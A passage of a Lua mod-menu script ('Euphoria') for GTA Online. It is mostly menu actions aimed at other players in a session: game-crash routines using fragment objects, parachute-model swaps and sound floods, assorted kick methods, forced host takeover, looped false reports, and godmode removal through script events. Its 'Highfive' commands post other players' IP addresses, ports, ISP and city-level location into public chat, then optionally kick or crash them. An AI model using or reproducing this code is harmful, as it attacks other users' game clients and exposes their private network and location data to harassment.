            if tonumber(players.get_host_token(pid)) == 41 then
                if not isDetectionPresent(pid, "YimMenu User") then
                    players.add_detection(pid, "YimMenu User", TOAST_ALL, 100)
                    return
                end
            end
        end
        yield(250)
    end)

    ethmiscs:action("Who is Host & Script Host", {"whoishsh"}, "", function()
        host = pname(host())
        sh = pname(shost())
        yield(500)
        msg($"{host} is the Host and {sh} is the Script Host", false, true, true)
    end)

    action(ethmiscs, "Restart Script (Euphoria)", {"euphoriarestart", "erestart"}, "", function()
        restartscript()
    end)

    action(ethmiscs, "Stop Script (Euphoria)", {"euphoriastop", "estop"}, "", function()
        stopscript()
    end)

    local pop_multiplier_id

    toggle(ethmiscs, "No Traffic", {}, "", function(on)
        if on then
            local ped_sphere, traffic_sphere
            if config.disable_peds then ped_sphere = 0.0 else ped_sphere = 1.0 end
            if config.disable_traffic then traffic_sphere = 0.0 else traffic_sphere = 1.0 end
            pop_multiplier_id = MISC.ADD_POP_MULTIPLIER_SPHERE(1.1, 1.1, 1.1, 15000.0, ped_sphere, traffic_sphere, false, true)
            MISC.CLEAR_AREA(1.1, 1.1, 1.1, 19999.9, true, false, false, true)
        else
            MISC.REMOVE_POP_MULTIPLIER_SPHERE(pop_multiplier_id, false);
        end
    end)

    ethmiscs:toggle("im_too_strong's Force Relay Connection", {"efrc"}, "", function(state)
        memory.write_byte(FRC_address, state ? 1 : 0)
    end)

    toggle(ethmiscs, "Ghost Mode", {"aghostmode", "adminmode"}, "", function(on)
        if on then
            coms("otr on; hidefromplayerlist on; invisibility on")
        else
            coms("otr off; hidefromplayerlist off; invisibility off")
        end
    end)

    scripthosting:toggle_loop("Force Script Host", {"forcesh"}, "", function()
        user = players.user()
        sh = players.get_script_host()

        yield(shdelay2)
        if user != sh then
            coms("scripthost")
            toast("Forced Script Host and perhaps broke session!")
        end
    end)

    scripthosting:toggle_loop("Force Host", {"forceh"}, "", function()
        nhp = players.get_host_queue_position(user)
        h = pname(host())
        h2 = host(user)

        yield(shdelay2)
        if nhp == 1 then
            coms("kick"..h)
        end
        toast("Kicking the host...")
        if user == h2 then
            toast("Turning off Force Host because you are host already.")
            coms("forceh off")
        end
    end)

    local shdelay2 = 5000
    shdelay = scripthosting:slider("Force Delay", {}, "For both Host and Script Host forcing.", 1, 20000, 5000, 100, function(shdelay2)
        shdelay2 = delayshval
    end)

    action(friendlyall, "helpall", {"helpall"}, "", function()
        yield(500)
        msg("Ear Warning (You got 20 seconds to cut your volume)", false, true, true)
        yield(20000)
        coms("givecollectiblesall")
        coms("rpall")
        yield(1000)
        msg("Friendly note to ask you to NOT ask for more :)", false, true, true)
    end, nil, nil, COMMANDPERM_FRIENDLY)

    action(friendlyall, "helpall textless", {"helpalltxtless"}, "", function()
        yield(500)
        coms("givecollectiblesall")
        coms("rpall")
    end, nil, nil, COMMANDPERM_FRIENDLY)

-- Misc stuff

    action(customv1, "Uncorrupt", {"uncorrupt"}, "", function()
        coms("forcequittosp")
    end)

    action(customv1, "stand version", {"standversion"}, "", function()
        async_http.init("https://stand.gg/versions.txt", nil, function(data)
            msg("The latest Stand version is "..data:split(":")[2], false, true, true)
        end)
        async_http.dispatch()
    end)

    action(customv1, "euphoria version", {"euphoriaversion"}, "", function()
        async_http.init("https://raw.githubusercontent.com/ScriptHost/Euphoria/main/ver.txt", nil, function(data)
            msg("Latest Euphoria release is "..data:split(":")[2]..", currently installed version is "..scriptver, false, true, true)
        end)
        async_http.dispatch()
    end)

    action(customv1, "help", {"help"}, "", function()
        yield(500)
        msg("whoishsh ; help2", false, true, true)
    end, nil, nil, COMMANDPERM_FRIENDLY)

    action(customv1, "help2", {"help2"}, "", function()
        yield(500)
        msg("helpall(t) ; standversion ; euphoriaversion ; credits ; menued ; help3", false, true, true)
    end, nil, nil, COMMANDPERM_FRIENDLY)

    action(customv1, "help3", {"help3"}, "", function()
        yield(500)
        msg("rid NAME ; money NAME ; kd NAME ; vpn NAME ; modcheck NAME ; highfive NAME ; hostposition NAME ; hosttoken NAME", false, true, true)
    end)

    action(customv1, "menu edition", {"menued"}, "", function()
        edition = menu.get_edition()
        yield(500)
        if edition == 1 then
            msg("I have Stand Basic", false, true, true)
        end
        if edition == 2 then
            msg("I have Stand Regular", false, true, true)
        end
        if edition == 3 then
            msg("I have Stand Ultimate", false, true, true)
        end
    end)

    action(customv1, "credits", {"credits"}, "", function()
        yield(500)
        msg("ScriptHostLocker ; Euphoria's Current Dev", false, true, true)
        yield(500)
        msg("Akolpa / AnyaSenpai ; OG Euphoria Dev", false, true, true)
        yield(500)
        msg("Sainan ; Stand Dev, without her, this script wouldnt exist!", false, true, true)
        yield(500)
        msg("And Stand's community, without them, I wouldn't be so far into this script !", false, true, true)
    end, nil, nil, COMMANDPERM_FRIENDLY)


-- Util Player (AKA Crash all n kick all)

    action(pall15, "Breakout Non-Host", {"sessbreakoutnonh"}, "", function()
        AnnoyHostKick(playerID)
    end)

    action(pall15, "Breakout (Host Required)", {"sessbreakouth"}, "", function()
        if user == host() then
            k4(playerID)
        else
            toast("You are not host!")
        end
    end)

    pall2:action("Boat Skin Crash", {}, "", function()
        coms("apt72all")
        yield(15000)
        PED.SET_PED_COORDS_KEEP_VEHICLE(PLAYER.PLAYER_PED_ID(), -74.94, -818.58, 327) -- mazebank
         spped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
         ppos = ENTITY.GET_ENTITY_COORDS(spped, true)
        for n = 0 , 5 do
             objhash = joaat("prop_byard_rowboat4")
             STREAMING.REQUEST_MODEL(objhash)
             while not STREAMING.HAS_MODEL_LOADED(objhash) do
              yield()
            end
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(user, objhash)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, 0, 0, 500, false, true, true)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(spped, 0xFBAB5776, 100, false)
            sleep(1000)
            for i = 0 , 20 do
                PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 144, 1.0)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(spped)
            end
            yield(1000)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
    
             objhash2 = joaat("prop_byard_rowboat4")
             STREAMING.REQUEST_MODEL(objhash2)
            while not STREAMING.HAS_MODEL_LOADED(objhash2) do
                yield()
            end
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(user, objhash2)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, 0, 0, 500, false, false, true)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(spped, 0xFBAB5776, 1000, false)
            sleep(1000)
            for i = 0 , 20 do
                PED.FORCE_PED_TO_OPEN_PARACHUTE(spped)
                PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 144, 1.0)
            end
            sleep(1000)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spped, ppos.x, ppos.y, ppos.z, false, true, true)
    end)

    pall2:toggle_loop('Auto Sound Crash', {}, '', function ()
        for players.list_except(true) as playerID do
            coms("apt72all")
            local time = (util.current_time_millis() + 2000)
            while time > util.current_time_millis() do
                local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
                for i = 1, 10 do
                    AUDIO.PLAY_SOUND_FROM_COORD(-1, 'Oneshot_Final', pc.x, pc.y, pc.z, 'MP_MISSION_COUNTDOWN_SOUNDSET', 1, 10000, 0)
                end
                util.yield_once()
            end
        end
    end)

    action(KickPlay5, "Classic Interior Kick All", {""}, "", function()
        coms("interiorkickall")
    end)
        
    action(KickPlay5, "TP All : Paleto Garage (Strawberry)", {""}, "", function()
        coms("apt45all")
    end)

    action(pall2, "Stop all sounds", {}, "", function ()
        for i=0,99 do
        AUDIO.STOP_SOUND(i)
        util.yield() 
        end
    end)

-- RP Loop All (Yoinked from Jinx)
    local rp_loop = friendlyall:list("RP Loop", {}, "Loops RP on everyone in the lobby.")
    local level = 120
    rp_loop:slider("Stop At Level...", {"rplobbylvl"}, "", 1, 8000, 120, 1, function(val)
        level = val
    end)

    local delay = 5
    rpLoopAll = rp_loop:slider("Loop Delay", {"lobbydelay"}, 'Note: setting the delay to "Fastest" will cause a fatal error in bigger lobbies and may lead to some issues.', 0, 2500, 5, 5, function(val)
        delay = val
    end)
    valreplace(rpLoopAll, 0, "Fastest (Read Description)")
    valreplace(rpLoopAll, 5, "Default")

    local function triggerCollectibleLoop(playerID, i)
        if players.get_rank(playerID) >= level then return end
        util.trigger_script_event(1 << playerID, {968269233, players.user(), 4, i, 1, 1, 1})
        util.trigger_script_event(1 << playerID, {968269233, players.user(), 8, -1, 1, 1, 1})
    end

    local lobbyRPLoop
    lobbyRPLoop = rp_loop:toggle_loop("Enable Loop", {"lobbyrpl"}, "Enables RP Loop on everyone in the lobby.", function()
        if not isNetPlayerOk(players.user(), true, true) then
            lobbyRPLoop.value = false
            return
        end
        for players.list_except(true) as playerID do
            if not menu.player_root(playerID):isValid() then return end
            local giveRP = menu.ref_by_rel_path(menu.player_root(playerID), "Friendly>Give RP")
            if players.is_marked_as_modder(playerID) or players.get_weapon_damage_modifier(playerID) == 1 or not isNetPlayerOk(playerID) or players.get_rank(playerID) >= level then continue end
            if delay == 0 then
                for i = 21, 24 do
                    triggerCollectibleLoop(playerID, i)
                    giveRP:trigger()
                end
            elseif delay == 5 then
                triggerCollectibleLoop(playerID, math.random(21, 24)) -- limiting the amount of script events sent to prevent a fatal error
            else
                for i = 21, 24 do
                    triggerCollectibleLoop(playerID, i)
                end
                yield(delay)
            end
        end	
    end)

-- Player

    local function player(playerID)

        -- Utilities

            local pid = playerID
            local user = players.user()
            local proot = menu.player_root(pid)
            local vpn = players.is_using_vpn(pid)
            local name = players.get_name(pid)
            local RID = players.get_rockstar_id(pid)
            local gamelang = getvaluee(refbyrpath(proot, "Information>Status>Language"))
            local ht = getvaluee(refbyrpath(proot, "Information>Host Token"))
            local hp = getvaluee(refbyrpath(proot, "Information>Host Queue Position"))
            local Country = getvaluee(refbyrpath(proot, "Information>Connection>Country"))
            local City = getvaluee(refbyrpath(proot, "Information>Connection>City"))
            local Region = getvaluee(refbyrpath(proot, "Information>Connection>Region"))
            local Total = getvaluee(refbyrpath(proot, "Information>Stats>Money In Total"))
            local Bank = getvaluee(refbyrpath(proot, "Information>Stats>Money In Bank"))
            local Cash = getvaluee(refbyrpath(proot, "Information>Stats>Money In Wallet"))
            local LanIP = getvaluee(refbyrpath(proot, "Information>Connection>LAN IP"))
            local IP = getvaluee(refbyrpath(proot, "Information>Connection>IP Address"))
            local IPP = getvaluee(refbyrpath(proot, "Information>Connection>Port"))
            local RelPort = getvaluee(refbyrpath(proot, "Information>Connection>Relay Port"))
            local RelIP = getvaluee(refbyrpath(proot, "Information>Connection>Relay IP"))
            local ISP = getvaluee(refbyrpath(proot, "Information>Connection>ISP"))
            local kd = players.get_kd(pid)
            local rank = players.get_rank(pid)
            local admin = players.is_marked_as_admin(pid)
            local mod = players.is_marked_as_modder(pid)
            local anya = players.get_rockstar_id(pid) == 244695618
            local shl = RID == 252617333
            local yutsana = RID == 248147543
            local host = players.get_host()
            local comfriend = COMMANDPERM_FRIENDLY
            local comtox = COMMANDPERM_TOXIC
            local host = players.get_host
            local trigse = util.trigger_script_event

        -- Detections

            if name != username then
                if RID == 252617333 then -- ScriptHostLocker
                    if not isDetectionPresent(pid, "Euphoria Developer") then
                     players.add_detection(pid, "Euphoria Developer", TOAST_ALL, 100)
                    end
                end
            end
        
        -- Lists
            ponlined = divider(proot, "Euphoria", {}, "")
            ponline = list(proot, "Euphoria", {}, "")
            ponline2 = list(ponline, "Informations in chat", {}, "")
            ccrash = list(refbyrpath(proot, "Crash"), "Euphoria Crashes", {}, "")
            trolalldivider = divider(refbyrpath(proot, "Trolling"), "Euphoria", {}, "")
            trolall = list(refbyrpath(proot, "Trolling"), "Euphoria Trolling", {}, "")
            fonlinedivider = divider(refbyrpath(proot, "Friendly"), "Euphoria", {}, "")
            fonline = list(refbyrpath(proot, "Friendly"), "Friendly", {}, "")
            fonlinerpl = list(fonline, "RP Loop", {}, "")
            reportingdivider = divider(refbyrpath(proot, "Increment Commend/Report Stats"), "Euphoria", {}, "")
            reporting = list(refbyrpath(proot, "Increment Commend/Report Stats"), "Spammers", {}, "")
            antigod = list(ponline, "Anti-God", {}, "")
            kick = list(refbyrpath(proot, "Kick"), "Kick With Reason", {}, "")
        -- Individual RP Loop

            local levelPly = 120
            fonlinerpl:slider("Stop At Level...", {"maxlevel"}, "", 1, 8000, 120, 1, function(val)
                levelPly = val
            end)

            local delayPly = 0
            fonlinerpl:slider("Loop Delay", {"loopdelay"}, "", 0, 2500, 0, 10, function(val)
                delayPly = val
            end)

            local rpLoopPlyr
            rpLoopPlyr = fonlinerpl:toggle_loop("Enable Loop", {"rploop"}, $"Enables RP Loop on {name}", function()
                if not proot:isValid() then return end
                local giveRP = refbyrpath(proot, "Friendly>Give RP")
                if rank(playerID) >= levelPly then 
                    toast($"{name} is already at or above level {levelPly}. :)")
                    rpLoopPlyr.value = false
                    return 
                end
                repeat
                    for i = 21, 24 do
                        if rank(playerID) >= levelPly then break end
                        trigse(1 << playerID, {968269233, players.user(), 4, i, 1, 1, 1})
                        trigse(1 << playerID, {968269233, players.user(), 8, -1, 1, 1, 1})
                        giveRP:trigger()
                        if delayPly > 0 then
                            yield(delayPly)
                        end
                    end
                    yield()
                until rank(playerID) >= levelPly or not rpLoopPlyr.value
                if rank(playerID) >= levelPly then 
                    toast($"{players.get_name(playerID)} is now at level {levelPly}. :)")
                    rpLoopPlyr.value = false
                    yield()
                    yield()
                    return 
                end
            end)
        -- Chat Features
            action(ponline2, "Send HT in chat", {"hosttoken"}, "Sends the players host token in chat", function()
                yield(500)
                msg($"{name}'s host token is : {ht}", false, true, true)
            end, nil, nil, comfriend)

            action(ponline2, "Send HP in chat", {"hostposition"}, "Sends the players host position in chat", function()
                yield(500)
                if hp == "N/A" then
                    msg($"{name} is the Host of the session.", false, true, true)
                else
                    msg($"{name}'s place in the host queue is : {hp}", false, true, true)
                end
            end, nil, nil, comfriend)

            action(ponline2, "Send RID in chat", {"rid"}, "Sends the players RID in chat", function()
                yield(500)
                msg($"Here is {name}'s RID : {RID}", false, true, true)
            end, nil, nil, comfriend)

            action(ponline2, "Country + Game Language", {"language"}, "Send the players Country IP and Game Language.", function()
                yield(500)
                msg($"{name}'s country is {Country} and their game language is {gamelang}", false, true, true)
            end)

            -- Highfives
                highfive = list(ponline2, "Highfives", {}, "")

                local hfdelay = 10000
                slider(highfive, "Kick / Crash Delay", {}, "For Highfive V2 and Highfive V3.", 0, 60000, 10000, 1000, function(hfdelay2)
                    hfdelay = hfdelay2
                end)

                action(highfive, "Highfive", {"highfive"}, "Leaks IP, location and other stuff.", function()
                    if shl then
                        yield(200)
                        msg("Sorry but you cannot use that command on Euphoria Staff!", false, true, true)
                    else
                        if vpn or ISP == "Proton AG" then
                            yield(1000)
                            msg($"{name} is using a VPN. Their ISP is {ISP}", false, true, true)
                        else
                            yield(1000)
                            msg($"{name}'s Relay IP is {RelIP}:{RelPort}, his Lan IP is {LanIP} and his IP is {IP}:{IPP}", false, true, true)
                            yield(200)
                            msg($"{name}'s RID is {RID}, their game language is {gamelang}, he lives at {Country}, {Region}, {City}.", false, true, true)
                            yield(20)
                        end
                    end
                end, nil, nil, comtox)

                action(highfive, "Highfive V2", {"highfivev2"}, "Leaks IP, location and other stuff with a kick at the end.", function()
                    if shl then
                        msg("Sorry but you cannot use that command on the developer!", false, true, true)
                    else
                        commands($"highfive{name}")
                        yield(hfdelay2)
                        if user == host then
                            commands($"loveletter{name}")
                        else
                            commands($"kick{name}")
                        end
                    end
                end, nil, nil, comtox)

                action(highfive, "Highfive V3", {"highfivev3"}, "Leaks IP, location and other stuff with a crash at the end.", function()
                    if shl then
                        msg("Sorry but you cannot use that command on the developer.", false, true, true)
                    else
                        commands($"highfive{name}")
                        yield(hfdelay2)
                        commands($"ultimatecrash{name}")
                    end
                end, nil, nil, comtox)
            
            action(ponline2, "Send Money in chat", {"money"}, "Sends the players money in chat", function()
                yield(500)
                msg($"{name} has {Cash}$ in their wallet, {Bank}$ in their bank, totaling {Total}$.", false, true, true)
            end, nil, nil, comfriend)
            
            action(ponline2, "Send KD in chat", {"kd"}, "Sends the players KD in chat", function()
                yield(500)
                msg($"{name} has a KD of {kd}.", false, true, true)
            end, nil, nil, comfriend)
            
            action(ponline2, "Send VPN User in chat", {"vpn"}, "Sends whether the player is using a VPN or not in chat", function()
                yield(500)
                if anya then
                    msg("Your dear goddess will always use a VPN !", false, true, true)
                else
                    if vpn then
                        msg($"{name} is using a VPN.", false, true, true)
                    else
                        if ISP == "Proton AG" or ISP == "Nomotech SAS" or ISP == "NordNet SA" then
                            msg($"{name} is using a VPN that isnt detected by default.", false, true, true)
                        else
                            msg($"{name} isn't using a VPN.", false, true, true)
                        end
                    end
                end
            end, nil, nil, comfriend)
            
            action(ponline2, "Modder Reveal", {"modcheck"}, "Sends whether the player is Modding or not in chat", function()
                yield(500)
                if not mod then
                    msg($"{name} is not a modder", false, true, true)
                else
                    if shl then
                        msg("Your dear goddess will always be a modder ;)", false, true, true)
                    else
                        msg("{name} is a modder.", false, true, true)
                    end
                end
            end, nil, nil, comfriend)

        -- Spammers and crashes and others
            -- Spam reports

                local RepDly = 3000
                reportDly = reporting:slider("Loop Delay", {}, 'The lower the laggier.\n1000 = 1 second', 0, 10000, 3000, 100, function(RepDlyVal)
                    RepDly = RepDlyVal
                end) -- Report / Commend all reasons

                reportingin = list(reporting, "Individual Reason Spammer", {}, "")

                toggle_loop(reporting, "Spam Reports", {"spamrep"}, "Spam each type of report.", function()
                    coms($"reportgriefing{name};reportexploits{name};reportbugabuse{name};reportannoying{name}; reporthate{name};reportvcannoying{name};reportvchate{name}")
                    yield(RepDly)
                end)

                local RepDly2 = 3000
                reportDly2 = reportingin:slider("Loop Delay - Individual Reporting", {}, 'The lower the laggier.\n1000 = 1 second', 0, 10000, 3000, 100, function(RepDlyVal2)
                    RepDly2 = RepDlyVal2
                end) -- Individual Report

                toggle_loop(reportingin, "Spam : Griefing or Disruptive Gameplay", {}, "", function ()
                    coms($"reportgriefing{name}")
                    yield(RepDly2)
                end)

                toggle_loop(reportingin, "Spam : Cheating or Modding", {}, "", function ()
                    coms($"reportexploits{name}")
                    yield(RepDly2)
                end)

                toggle_loop(reportingin, "Spam : Glitching or Abusing Game Features", {}, "", function ()
                    coms($"reportbugabuse{name}")
                    yield(RepDly2)
                end)

                toggle_loop(reportingin, "Spam : Text - Annoying Me", {}, "", function ()
                    coms($"reportannoying{name}")
                    yield(RepDly2)
                end)

                toggle_loop(reportingin, "Spam : Text - Hate Speech", {}, "", function ()
                    coms($"reporthate{name}")
                    yield(RepDly2)
                end)

                toggle_loop(reportingin, "Spam : Voice - Annoying Me", {}, "", function ()
                    coms($"reportvcannoying{name}")
                    yield(RepDly2)
                end)

                toggle_loop(reportingin, "Spam : Voice - Hate Speech", {}, "", function ()
                    coms($"reportvchate{name}")
                    yield(RepDly2)
                end)

                reportingin2 = list(reporting, "Individual Commendation Spam", {}, "")

                toggle_loop(reporting, "Spam Commendations", {"spamcom"}, "Might drop your FPS", function()
                    coms($"commendfriendly{name}")
                    coms($"commendhelpful{name}")
                    yield(RepDly)
                end)

                local RepDly3 = 3000
                reportDly3 = reportingin2:slider("Loop Delay - Individual Commending", {}, 'The lower the laggier.\n1000 = 1 second', 0, 10000, 3000, 100, function(RepDlyVal3)
                    RepDly3 = RepDlyVal3
                end) -- Individual Commends

                toggle_loop(reportingin2, "Helpful", {}, "", function ()
                    coms($"commendhelpful{name}")
                    yield(RepDly3)
                end)

                toggle_loop(reportingin2, "Friendly", {}, "", function ()
                    coms($"commendfriendly{name}")
                    yield(RepDly3)
                end)
                
                divider(reporting, "v Intense FPS Drops v")
                
                toggle(reporting, "Spam Both", {}, "Will drop your FPS", function()
                    coms($"spamrep{name}")
                    coms($"spamcom{name}")
                end)


            -- Crashes
                action(ccrash, "2Take1 Crash (Fragment)", {"2t1crash"}, "", function(on_toggle)
                    local object = entities.create_object(joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
                    OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
                    util.yield(1000)
                    entities.delete_by_handle(object)
                end)

                action(ccrash, "Crash n kick", {"crashkick"}, "Crashes then kicks the player, for safety ;)", function()
                    coms($"crash{name}")
                    yield(50)
                    coms($"footlettuce{name}")
                    yield(50)
                    coms($"slaughter{name}")
                    yield(50)
                    coms($"steamroll{name}")
                    yield(1000)
                    if user == host then
                        coms($"loveletterkick{name}")
                    else
                        coms($"kick{name}")
                        toast("You weren't host so I did a Smart kick instead ;)")
                    end
                end, nil, nil, comtox)

                action(ccrash, "Crash n kick V2", {"ultimatecrash"}, "Crashes then kicks the player (a bit more aggressively), for safety ;)", function()
                    coms($"ptfxscale {name} 10")
                    coms($"particlespam{name}")
                    yield(200)
                    coms($"crashkick{name}")
                end, nil, nil, comtox)

                action(ccrash, "All typa crash", {"allcrash"}, "Crashes the player with everything it can.", function()
                    coms($"crash{name}")
                    yield(50)
                    coms($"footlettuce{name}")
                    yield(50)
                    coms($"slaughter{name}")
                    yield(50)
                    coms($"steamroll{name}")
                    yield(1000)
                end)

                action(trolall, "Turn all on/off", {"turnonalltroll"}, "", function()
                    coms($"pwanted{name}")
                    coms($"freeze{name}")
                    coms($"fakemoneydrop{name}")
                    coms($"nopassivemode{name}")
                    coms($"confuse{name}")
                    coms($"ragdoll{name}")
                    coms($"shakecam{name}")
                    coms($"gravitate{name}")
                    coms($"aggressivenpcs{name}")
                    coms($"mugloop{name}")
                    coms($"kill{name}")
                    coms($"explode{name}")
                    coms($"ptfxscale {name} 10")
                    coms($"particlespam{name}")
                    coms($"bounty {name} 10000")
                    coms($"loopbounty{name}")
                    coms($"notifyspam{name}")
                    coms($"sendtojob{name}")
                    coms($"vehkick{name}")
                    coms($"interiorkick{name}")
                    coms($"novehs{name}")
                    coms($"ceokick{name}")
                    coms($"infiniteloading{name}")
                    coms($"mission{name}")
                    coms($"raid{name}")
                    coms($"disarm{name}")
                    coms($"killloop{name}")
                    coms($"explodeloop{name}")
                end)

                action(trolall, "Streaming", {"streamerez"}, "", function()
                    coms($"confuse{name}")
                    coms($"ptfxscale {name} 10")
                    coms($"particlespam{name}")
                    coms($"ragdoll{name}")
                    coms($"givecollectibles{name}")
                    coms($"rplooplvl {name} 8000")
                    coms($"rploop{name}")
                    coms($"rp{name}")
                    coms($"snack{name}")
                    coms($"figurines{name}")
                    coms($"cards{name}")
                end)
                    
                action(ccrash, "Trolley Crash >.<", {"trolleycrash"}, "Turns on every trolling options and does everything to remove the dude.", function()
                    coms($"turnonalltroll{name}")
                    coms($"allcrash{name}")
                    if not user == host then
                        coms($"kick{name}")
                    end
                end)

                hvhlist = list(ccrash, "HvH Pro", {}, "", function ()
                end)

                action(hvhlist, "HvH Pro be like", {"hvh"}, "", function()
                    coms($"crash{name}")
                    yield(25)
                    coms($"footlettuce{name}")
                    yield(25)
                    coms($"slaughter{name}")
                    yield(25)
                    coms($"steamroll{name}")
                    yield(25)
                    coms($"turnonalltroll{name}")
                    yield(25)
                    if not user == host then
                        coms($"kick{name}")
                        coms($"aids{name}")
                        coms($"orgasmkick{name}")
                        coms($"nonhostkick{name}")
                        coms($"pickupkick{name}")
                    end
                end)

                toggle_loop(hvhlist, "HvH Pro Looped", {"hvhloop"}, "Laggy!", function()
                    coms($"crash{name}")
                    coms($"footlettuce{name}")
                    coms($"slaughter{name}")
                    coms($"steamroll{name}")
                    coms($"turnonalltroll{name}")
                    if not user == host then
                        coms($"kick{name}")
                        coms($"aids{name}")
                        coms($"orgasmkick{name}")
                        coms($"nonhostkick{name}")
                        coms($"pickupkick{name}")
                    end
                end)
            -- Kicks?
                -- Input
                    kreason = textinput(kick, "Reason", {"kickreason"}, "", function()
                    end)
                -- Kick
                    -- Kick with Reason
                        -- Function
                            local ktypes = {
                                S = "Starless Kick",
                                PO = "Pool Overflow Kick",
                                US = "Unsync Kick",
                                STSP = "Send to SP Kick",
                                BL = "Session Ban",
                                H = "Host Kick",
                                NH = "Non-Host Kick",
                                InvP = "Corrupted Figurine Kick"
                            }
                            local function kickreason()
                                local valreason = getvaluee(refbyrpath(proot, "Kick>Kick With Reason>Reason"))
                                local valtype = getvaluee(refbyrpath(proot, "Kick>Kick With Reason>Kick Type"))
                                if valtype == 0 then
                                    coms($"kick{name}") -- Smart
                                    toast($"Kicked {name} using Smart Kick")
                                    yield(1000)
                                    msg($"{name} got kicked via {valtype} / {ktypes.S} for {valreason}.", false, true, true)
                                end
                                if valtype == 1 then
                                    coms($"aids{name}") -- Pool's Closed
                                    toast($"Kicked {name} using Pool's Closed Kick")
                                    yield(1000)
                                    msg($"{name} got kicked via {ktypes.PO} for {valreason}.", false, true, true)
                                end
                                if valtype == 2 then
                                    coms($"loveletterkick{name}") -- Love Letter
                                    toast($"Kicked {name} using Love Letter / Unsync Kick")
                                    yield(1000)
                                    msg($"{name} got kicked via {ktypes.US} for {valreason}.", false, true, true)
                                end
                                if valtype == 3 then
                                    coms($"orgasmkick{name}") -- Orgasm
                                    toast($"Kicked {name} using Orgasm Kick")
                                    yield(1000)
                                    msg($"{name} got kicked via {ktypes.STSP} for{valreason}.", false, true, true)
                                end
                                if valtype == 4 then
                                    if user != host() then
                                        toast("You aren't host.")
                                    else
                                        coms($"blacklist{name}") -- Blacklist
                                        toast($"Kicked {name} using Blacklist Kick")
                                        yield(1000)
                                        msg($"{name} got kicked via {ktypes.BL} for {valreason}.", false, true, true)
                                    end
                                end
                                if valtype == 5 then
                                    if user != host() then
                                        toast("You aren't host.")
                                    else
                                        coms($"hostkick{name}") -- Host
                                        toast($"Kicked {name} using Host Kick")
                                        yield(1000)
                                        msg($"{name} got kicked via {ktypes.H} for {valreason}.", false, true, true)
                                    end
                                end
                                if valtype == 6 then
                                    coms($"nonhostkick{name}") -- NHost
                                    toast($"Kicked {name} using Non-Host Kick")
                                    yield(1000)
                                    msg($"{name} got kicked via {ktypes.NH} for {valreason}.", false, true, true)
                                end
                                if valtype == 7 then
                                    coms($"pickupkick{name}") -- Inv. Pickup
                                    toast($"Kicked {name} using Invalid Pickup Kick")
                                    yield(1000)
                                    msg($"{name} got kicked via {ktypes.InvP} for {valreason}.", false, true, true)
                                end
                            end
                        -- Slider
                            ktype = clickslider(kick, "Kick Type", {"kicktype"}, "", 0, 7, 0, 1, function(on_click)
                                kickreason()
                            end)
                            valreplace(ktype, 0, "Smart")
                            valreplace(ktype, 1, "Pool's Closed")
                            valreplace(ktype, 2, "Love Letter")
                            valreplace(ktype, 3, "Orgasm")
                            valreplace(ktype, 4, "Blacklist [Host Only]")
                            valreplace(ktype, 5, "Host [Host Only]")
                            valreplace(ktype, 6, "Non-Host")
                            valreplace(ktype, 7, "Invalid Pickup")

                        
        -- Anti-Godmode

            local isGodmodeRemovable = {}

            antigod:toggle_loop("Remove Player Godmode", {}, lang.get_localised(-748077967), function()
                trigse(1 << playerID, {800157557, players.user(), 225624744, math.random(0, 9999)})
            end)

            antigod:action("Orbital Strike", {"orbgod"}, lang.get_localised(-748077967), function()
                local timer = util.current_time_millis() + 3500
                local ped = GET_PLAYER_PED_SCRIPT_INDEX(playerID)
                local vehicle = GET_VEHICLE_PED_IS_USING(ped)
                if IS_PLAYER_DEAD(playerID) then return end
                if IS_REMOTE_PLAYER_IN_NON_CLONED_VEHICLE(playerID)then
                    toast($"{name}'s ped has not been cloned yet. :/")
                    return
                end

                if not isPlayerGodmode(playerID) then 
                    toast($"{name} is not in godmode or is using anti-detections. :/")
                    return 
                end
                
                repeat
                    toast("Removing Godmode...")
                    if util.current_time_millis() > timer then
                        toast($"Failed to remove {name}'s godmode. :/")
                        return
                    end
                    trigse(1 << pid, {800157557, players.user(), 225624744, math.random(0, 9999)})
                    yield()
                until not players.is_godmode(pid)
                isGodmodeRemovable[pid] = true

                if isGodmodeRemovable[pid] then
                    toast("Orbital Striking Player...")
                    if isPlayerInAnyVehicle(pid) and entities.is_invulnerable(vehicle) then
                        entities.request_control(vehicle, 2500)
                        SET_ENTITY_CAN_BE_DAMAGED(vehicle, true)
                        SET_ENTITY_INVINCIBLE(vehicle, false)
                        SET_ENTITY_PROOFS(vehicle, false, false, false, false, false, false, false, false)
                    end

                    setBit(memory.script_global(GlobalplayerBD + 1 + (players.user() * 463) + 424), 0)
                    yield(500) -- yielding so their game realizes I'm using the orb
                    local pos = players.get_position(pid)
                    ADD_OWNED_EXPLOSION(players.user_ped(), pos, 59, 1.0, true, false, 1.0)
                    USE_PARTICLE_FX_ASSET("scr_xm_orbital")
                    START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_xm_orbital_blast", pos, v3(), 1.0, false, false, false, true)
                    PLAY_SOUND_FROM_COORD(0, "DLC_XM_Explosions_Orbital_Cannon", pos, 0, true, 0, false) -- hardcoding sound id because GET_SOUND_ID doesnt work sometimes
                    godKill(pid)
                    yield(1000) -- yielding here isnt needed but it gives yourself the notification that you orbed them
                    clearBit(memory.script_global(GlobalplayerBD + 1 + (players.user() * 463) + 424), 0)
                    yield(3000)
                    STOP_SOUND(0)
                    isGodmodeRemovable[pid] = false
                end
            end)

